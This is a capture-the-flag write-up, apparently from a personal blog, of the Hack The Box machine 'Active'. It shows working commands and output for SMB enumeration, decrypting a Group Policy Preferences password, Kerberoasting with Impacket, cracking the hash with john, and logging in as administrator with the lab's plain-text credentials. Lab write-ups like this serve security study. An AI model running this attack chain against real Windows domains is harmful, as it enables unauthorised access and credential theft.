---
layout: post
title: HTB - active
date: 2025-01-22 13:37 -0400
---

![active](/assets/img/active.png)

# user
## starting with nmap
classic windows ports open

```bash
~/workspace/projects/htb/active » sudo nmap -p- --min-rate 1024 $(cat ip.txt)                     shafou@shafou
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-30 13:56 -04
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.23s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
49173/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.62 seconds
~/workspace/projects/htb/active » nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -A active.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-30 13:59 -04
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-30 17:59:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   210:
|_    Message signing enabled and required
|_clock-skew: 1s
| smb2-time:
|   date: 2024-12-30T18:00:44
|_  start_date: 2024-12-30T04:11:38

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.13 seconds
```

## smbmap
```bash
~/workspace/projects/htb/active » smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
	Users                                             	NO ACCESS	
```

We can list all files by doing:
`smbmap -H 10.10.10.100 -r Replication --depth 8 --no-banner`
looks like you need to specify depth for it to work.

The important file here is Groups.xml, it contains an encrypted password.
It can be decrypted with [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt).
That gives us a username and a password.
We then login to smb and read the user flag.

`e5182**************************`

# root

After that we use inpacket `GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -save` to do a Kerberoasting attack.

That gives us an encrypted hash that we can then try and bruteforce.

```bash
~/workspace/projects/htb/active » /home/shafou/workspace/programs/john/run/john --wordlist=/home/shafou/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:03 DONE (2025-01-22 13:30) 0.2519g/s 2654Kp/s 2654Kc/s 2654KC/s Tiffani143..Thehulk2008
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then we just login to smb and read the root flag. No shells required.

```bash
~/workspace/projects/htb/active » smbclient -U 'administrator%Ticketmaster1968' '\\10.10.10.100\Users'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 299215 blocks available
smb: \> get Administrator\Desktop\root.txt
f48da***************************
/tmp/smbmore.Z6NdGW (END)
```
